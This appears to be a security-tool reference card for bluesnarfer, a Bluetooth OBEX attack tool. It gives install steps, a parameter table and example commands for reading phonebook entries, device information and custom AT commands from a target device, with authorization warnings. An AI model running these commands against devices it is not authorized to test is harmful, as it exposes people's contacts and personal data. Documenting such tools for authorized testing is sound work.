# bluesnarfer

- **Category**: Wireless / Bluetooth Attack
- **Risk Level**: 🔴 High

---

## Description

Bluetooth OBEX attack tool historically used to test unauthorized access to contacts, calendars, or files on vulnerable devices. Use only with explicit authorization for the specific device.

## Installation

```bash
apt-get update && apt-get install -y bluesnarfer
```

## Parameter Reference

| Parameter | Description |
|------|------|
| `-b <BD_ADDR>` | Target Bluetooth address |
| `-C <channel>` | RFCOMM channel |
| `-r N-M` | Retrieve phonebook entries from position N to M |
| `-w N-M` | Delete phonebook entries from position N to M |
| `-l` | List available phonebook memory storage options |
| `-c <ATCMD>` | Send a custom AT command |
| `-f <name>` | Search for a name in phonebook contacts |
| `-s <TYPE>` | Select phonebook memory storage type (e.g., `SM`, `DC`, `RC`) |
| `-i` | Retrieve device information |

## Common Commands

```bash
# List available phonebook memory storage on authorized device
bluesnarfer -b <BD_ADDR> -C <channel> -l

# Retrieve phonebook entries 1 through 100
bluesnarfer -b <BD_ADDR> -C <channel> -r 1-100

# Get device information
bluesnarfer -b <BD_ADDR> -C <channel> -i

# Send a custom AT command
bluesnarfer -b <BD_ADDR> -C <channel> -c ATCMD
```

## Notes & Tips

1. High-risk tool: can access personal data on vulnerable devices.
2. Confirm device ownership, BD_ADDR, channel, and allowed data types before use.
3. Use `sdptool browse <BD_ADDR>` to identify OBEX/RFCOMM channels.

---

## Official References

- [Kali bluesnarfer](https://www.kali.org/tools/bluesnarfer/)

